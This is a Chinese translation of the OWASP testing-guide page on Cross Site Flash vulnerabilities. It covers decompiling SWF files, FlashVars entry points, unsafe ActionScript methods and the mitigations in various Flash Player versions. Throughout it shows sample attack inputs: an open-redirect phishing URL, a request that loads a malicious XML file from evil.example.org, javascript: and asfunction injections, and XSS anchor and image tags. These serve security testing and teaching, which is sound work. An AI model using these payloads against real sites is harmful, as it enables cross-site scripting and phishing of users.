# 测试跨站Flash

|ID          |
|------------|
|WSTG-CLNT-08|

## 概述

ActionScript基于ECMAScript，是在处理交互需求时Flash应用程序使用的语言。有三个版本的ActionScript语言。ActionScript 1.0和ActionScript 2.0非常相似，ActionScript 2.0是ActionScript 1.0的扩展。ActionScript 3.0，随Flash Player 9一起推出，是对该语言的重写，以支持面向对象设计。

ActionScript，像其他语言一样，有一些可能导致安全问题的实现模式。特别是，由于Flash应用程序通常嵌入在浏览器中，DOM型跨站脚本（DOM XSS）等漏洞可能存在于有缺陷的Flash应用程序中。

跨站Flash（XSF）是一种具有与XSS类似影响的漏洞。

当从不同域发起以下场景时，会发生XSF：

- 一个影片加载另一个使用`loadMovie*`函数（或其他hack）的影片，并可以访问同一沙箱或其部分。
- HTML页面使用JavaScript命令Adobe Flash影片，例如通过调用：
    - `GetVariable`从JavaScript作为字符串访问Flash公共和静态对象。
    - `SetVariable`用JavaScript将静态或公共Flash对象设置为新字符串值。
- 浏览器与SWF应用程序之间的意外通信，这可能导致从SWF应用程序窃取数据。

XSF可能通过强制有缺陷的SWF加载外部恶意Flash文件来执行。此攻击可能导致XSS或修改GUI以欺骗用户在假Flash表单中插入凭据。在存在Flash HTML注入或外部SWF文件的情况下，当使用`loadMovie*`方法时，XSF可能发生。

### 开放重定向器

SWF有能力导航浏览器。如果SWF将目标作为FlashVar接收，则SWF可用作开放重定向器。开放重定向器是任何位于可信网站上的功能，攻击者可用它将最终用户重定向到恶意网站。这些经常在钓鱼攻击中使用。类似于跨站脚本，攻击涉及用户点击恶意链接。

在Flash情况下，恶意URL可能如下所示：

```text
https://trusted.example.org/trusted.swf?getURLValue=https://www.evil-spoofing-website.org/phishEndUsers.html
```

在上述示例中，最终用户可能看到URL以他们最喜欢的可信网站开头并点击它。链接将加载可信SWF，它获取`getURLValue`并将其提供给ActionScript浏览器导航调用：

```actionscript
getURL(_root.getURLValue,"_self");
```

这将导航浏览器到攻击者提供的恶意URL。此时，网络钓鱼者已成功利用用户对trusted.example.org的信任来欺骗用户访问他们的恶意网站。从那里，他们可以发起0-day、进行原始网站的欺骗或任何其他类型的攻击。SWF可能在网站上无意间充当开放重定向器。

开发人员应避免将完整URL作为FlashVars。如果他们仅计划在网站内导航，则应使用相对URL或验证URL以可信域和协议开头。

### 攻击和Flash Player版本

自2007年5月以来，Adobe发布了三个新版本的Flash Player。每个新版本都限制了一些先前描述的攻击。

| Player版本 | `asfunction` | ExternalInterface | GetURL | HTML注入 |
|----------------|--------------|-------------------|--------|----------------|
| v9.0 r47/48    |  是          |   是               | 是     |     是         |
| v9.0 r115      |  否          |   是               | 是     |     是         |
| v9.0 r124      |  否          |   是               | 是     |     部分        |

## 测试目标

- 反编译并分析应用程序代码。
- 评估接收器输入和不安全方法使用。

## 如何测试

自从"测试Flash应用程序"首次发布以来，已发布了新版本的Flash Player以缓解一些将要描述的攻击。然而，由于它们是不安全编程实践的结果，某些问题仍然可被利用。

### 反编译

由于SWF文件由嵌入在播放器本身的虚拟机解释，它们可以被潜在地反编译和分析。最知名和免费的ActionScript 2.0反编译器是flare。

要用flare反编译SWF文件，只需键入：

`$ flare hello.swf`

这会产生一个名为hello.flr的新文件。

反编译有助于测试人员，因为它允许对Flash应用程序进行白盒测试。快速网络搜索可以导致各种反汇编程序和flash安全工具。

### 未定义的变量FlashVars

FlashVars是SWF开发人员计划从网页接收的变量。FlashVars通常从HTML中的Object或Embed标签传递。例如：

```html
<object width="550" height="400" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,124,0">
    <param name="movie" value="somefilename.swf">
    <param name="FlashVars" value="var1=val1&var2=val2">
    <embed src="somefilename.swf" width="550" height="400" FlashVars="var1=val1&var2=val2">
</embed>
</object>
```

FlashVars也可以从URL初始化：

`https://www.example.org/somefilename.swf?var1=val1&var2=val2`

在ActionScript 3.0中，开发人员必须明确将FlashVar值分配给本地变量。通常如下所示：

```actionscript
var paramObj:Object = LoaderInfo(this.root.loaderInfo).parameters;
var var1:String = String(paramObj["var1"]);
var var2:String = String(paramObj["var2"]);
```

在ActionScript 2.0中，任何未初始化的全局变量都被假定为FlashVar。全局变量是以`_root`、`_global`或`_level0`开头的变量。这意味着如果属性如`_root.varname`在整个代码流程中未定义，它可能被URL参数覆盖：

`https://victim/file.swf?varname=value`

无论您查看ActionScript 2.0还是ActionScript 3.0，FlashVars都可能是攻击媒介。让我们看一些易受攻击的ActionScript 2.0代码示例：

示例：

```actionscript
movieClip 328 __Packages.Locale {

    #initclip
    if (!_global.Locale) {
    var v1 = function (on_load) {
        var v5 = new XML();
        var v6 = this;
        v5.onLoad = function (success) {
        if (success) {
            trace('Locale loaded xml');
            var v3 = this.xliff.file.body.$trans_unit;
            var v2 = 0;
            while (v2 < v3.length) {
            Locale.strings[v3[v2]._resname] = v3[v2].source.__text;
            ++v2;
            }
            on_load();
        } else {}
        };
        if (_root.language != undefined) {
        Locale.DEFAULT_LANG = _root.language;
        }
        v5.load(Locale.DEFAULT_LANG + '/player_' +
                            Locale.DEFAULT_LANG + '.xml');
    };
```

上述代码可通过以下请求进行攻击：

`https://victim/file.swf?language=https://evil.example.org/malicious.xml?`

### 不安全方法

当识别出入口点时，它表示的数据可能被不安全方法使用。如果数据未过滤或验证，可能导致某些漏洞。

自r47版本以来不安全的办法包括：

- `loadVariables()`
- `loadMovie()`
- `getURL()`
- `loadMovie()`
- `loadMovieNum()`
- `FScrollPane.loadScrollContent()`
- `LoadVars.load`
- `LoadVars.send`
- `XML.load( 'url' )`
- `LoadVars.load( 'url' )`
- `Sound.loadSound( 'url' , isStreaming );`
- `NetStream.play( 'url' );`
- `flash.external.ExternalInterface.call(_root.callback)`
- `htmlText`

### 通过反射XSS利用

SWF文件应托管在受害者主机上，并且必须使用反射XSS技术。攻击者强制浏览器直接加载到位置栏中的纯swf文件（通过重定向或社会工程），或者通过从恶意页面通过iframe加载它：

```html
<iframe src='https://victim/path/to/file.swf'></iframe>
```

在这种情况下，浏览器会像托管在受害者主机上一样自行生成HTML页面。

### GetURL (AS2) / NavigateToURL (AS3)

GetURL函数在ActionScript 2.0中，NavigateToURL在ActionScript 3.0中，让影片将URI加载到浏览器的窗口。如果未定义的变量用作getURL的第一个参数：

`getURL(_root.URI,'_targetFrame');`

或者如果FlashVar用作传递给navigateToURL函数的参数：

```actionscript
var request:URLRequest = new URLRequest(FlashVarSuppliedURL);
navigateToURL(request);
```

那么这意味着可以通过以下请求调用托管影片的同一域中的JavaScript：

`https://victim/file.swf?URI=javascript:evilcode`

`getURL('javascript:evilcode','_self');`

当仅控制`getURL`的部分通过DOM注入与Flash JavaScript注入时，也可能发生相同的情况：

```js
getUrl('javascript:function('+_root.arg+')')
```

### 使用`asfunction`

您可以使用特殊的`asfunction`协议来导致链接执行SWF文件中的ActionScript函数，而不是打开URL。直到发布Flash Player 9 r48，`asfunction`可用于每种将URL作为参数的方法。之后，`asfunction`被限制在HTML TextField内使用。

这意味着测试人员可以尝试注入：

```actionscript
asfunction:getURL,javascript:evilcode
```

在每个不安全方法中，例如：

```actionscript
loadMovie(_root.URL)
```

通过以下请求：

`https://victim/file.swf?URL=asfunction:getURL,javascript:evilcode`

### ExternalInterface

`ExternalInterface.call`是Adobe引入的静态方法，用于改善播放器/浏览器交互，适用于ActionScript 2.0和ActionScript 3.0。

从安全角度来看，当其参数的一部分可能被控制时，它可能被滥用：

```actionscript
flash.external.ExternalInterface.call(_root.callback);
```

这种漏洞的攻击模式可能类似于：

```js
eval(evilcode)
```

因为内部JavaScript由浏览器执行将类似于：

```js
eval('try { __flash__toXML('+__root.callback+') ; } catch (e) { "<undefined/>"; }')
```

### HTML注入

TextField对象可以通过设置来呈现最小HTML：

```actionscript
tf.html = true
tf.htmlText = '<tag>text</tag>'
```

因此，如果文本的部分可由测试人员控制，可以注入`<a>`标签或图像标签，导致修改GUI或对浏览器的XSS攻击。

使用`<a>`标签的一些攻击示例：

- 直接XSS：`<a href='javascript:alert(123)'>`
- 调用函数：`<a href='asfunction:function,arg'>`
- 调用SWF公共函数：`<a href='asfunction:_root.obj.function, arg'>`
- 调用本机静态为函数：`<a href='asfunction:System.Security.allowDomain,evilhost'>`

也可以使用图像标签：

```html
<img src='https://evil/evil.swf'>
```

在此示例中，需要`.swf`来绕过Flash Player内部过滤器：

```html
<img src='javascript:evilcode//.swf'>
```

自Flash Player 9.0.124.0版本以来，XSS不再可利用，但GUI修改仍可能完成。

以下工具可能有助于处理SWF：

- [OWASP SWFIntruder](https://wiki.owasp.org/index.php/Category:SWFIntruder)
- [反汇编程序 – Flasm](https://flasm.sourceforge.net/)
- [Swfmill – 将Swf转换为XML，反之亦然](https://www.swfmill.org/)
